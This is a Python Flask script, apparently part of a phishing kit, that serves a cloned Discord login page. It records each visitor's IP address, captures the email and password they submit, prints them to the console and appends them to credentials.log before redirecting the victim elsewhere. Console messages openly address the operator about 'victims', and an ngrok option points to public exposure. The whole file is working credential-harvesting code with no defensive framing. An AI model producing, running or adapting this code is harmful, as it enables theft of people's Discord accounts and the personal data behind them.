from flask import Flask, request, render_template, send_file, redirect
from threading import Thread
from colorama import Fore
from sys import argv
import sys
import colorama
import logging
import os

#### Variables
redirect_url = argv[1]
host = argv[2]
port = int(argv[3])
sitename = argv[4]
display_reqs = argv[5]
ngrok_use = argv[6]


#### Config
app = Flask(__name__)
colorama.init(autoreset=True)

if display_reqs != "y" and ngrok_use != "y":
    logging.getLogger('werkzeug').disabled = True
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
elif display_reqs != "y":
    logging.getLogger('werkzeug').disabled = True
    sys.modules['flask.cli'].show_server_banner = lambda *x: None


print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to go to the link...", end="\r")
#### App.route
@app.route("/")
def index():
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim has gone to the phishing page!" + " " * 40)
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found:", request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr)
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
    print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...",end="\r")
    return render_template("Discord.html")

@app.route("/login", methods=["POST"])
def getcreds():
    with open("credentials.log" , "a") as file:
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered credentials!"+ " " * 43)
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + request.form.get('email'), "\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + request.form.get('password') + " " * 100)
        file.write(f"{request.form.get('email')} : {request.form.get('password')} : {request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr} : {sitename}\n")
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
        return redirect(redirect_url)



@app.route('/Discord_files/0.70a90daa9b002d99a7e7.css')
def CSS():
    return send_file(os.path.join("templates", "Discord_files", "0.70a90daa9b002d99a7e7.css"))

@app.route("/Discord_files/36d4b341723daffd4a372e1b19591da1.png ")
def Logo1():
    return send_file(os.path.join("templates", "Discord_files", "36d4b341723daffd4a372e1b19591da1.png"))

@app.route("/Discord_files/14c037b7102f18b2d2ccf065a52bb595.jpg")
def Logo2():
    return send_file(os.path.join("templates", "Discord_files", "14c037b7102f18b2d2ccf065a52bb595.jpg"))


#### Execution
app.run(host=host, port=port)